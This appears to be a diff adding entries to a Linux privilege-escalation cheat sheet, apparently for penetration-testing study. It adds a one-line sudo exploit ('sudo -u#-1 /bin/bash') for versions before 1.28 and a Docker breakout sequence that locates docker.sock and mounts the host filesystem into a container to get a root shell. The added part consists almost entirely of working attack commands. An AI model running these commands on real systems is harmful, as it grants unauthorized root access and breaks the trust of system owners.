@@ -299,6 +299,20 @@ lsmod
 /sbin/modinfo libata # to find out more about the specific modules in lsmod
 ```
 
+### sudo < v1.28
+
+```bash
+sudo -u#-1 /bin/bash
+```
+
+### Docker Breakout
+
+```bash
+find / -name docker.sock 2>/dev/null
+docker images
+docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
+```
+
 ### SUIDs and GUIDs
 
 Aside from the rwx file permissions described previously, two additional special rights pertain to executable files: setuid and setgid. These are symbolized with the letter "s".
